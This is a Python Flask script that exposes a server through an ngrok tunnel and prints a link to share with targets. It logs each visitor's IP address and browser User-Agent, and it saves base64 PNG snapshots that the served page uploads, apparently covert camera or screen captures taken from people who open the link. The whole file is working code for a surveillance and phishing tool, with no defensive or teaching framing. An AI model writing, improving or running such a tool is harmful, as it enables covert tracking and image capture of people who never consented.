import os, json, time, threading, base64
from secrets import token_urlsafe
from flask import Flask, request, send_from_directory
from pyngrok import ngrok

CAP_DIR = "./captures"
STATIC_DIR = "./static"
os.makedirs(CAP_DIR, exist_ok=True)
LOG = f"{CAP_DIR}/scout_log.json"

app = Flask(__name__, static_folder=STATIC_DIR, static_url_path="")

def log_entry(d):
    with open(LOG, "a") as fh:
        fh.write(json.dumps(d) + "\n")

@app.route("/", methods=["GET"])
def index():
    ip = request.remote_addr
    ua = request.headers.get("User-Agent", "")
    ts = int(time.time())
    log_entry({"event":"visit","ip":ip,"ua":ua,"ts":ts})
    return send_from_directory(STATIC_DIR, "index.html")

@app.route("/upload", methods=["POST"])
def upload():
    data = request.get_json(force=True)
    if "png" in data:
        header, b64 = data["png"].split(",", 1)
        ts = int(time.time())
        path = f"{CAP_DIR}/scout_snap_{ts}.png"
        with open(path, "wb") as fh:
            fh.write(base64.b64decode(b64))
        log_entry({"event":"snapshot","file":path,"ts":ts})
    return "OK"

def cli_entry(_):
    slug = token_urlsafe(6)
    public = ngrok.connect(addr=8000, bind_tls=True).public_url
    print(f"Share this link:\\n{public}\\nCtrl+C to stop (logs in {LOG})")

    def run_app():
        app.run(host="0.0.0.0", port=8000, debug=False)
    threading.Thread(target=run_app, daemon=True).start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        ngrok.disconnect(public)
        ngrok.kill()
        print("Stopped, tunnel closed")
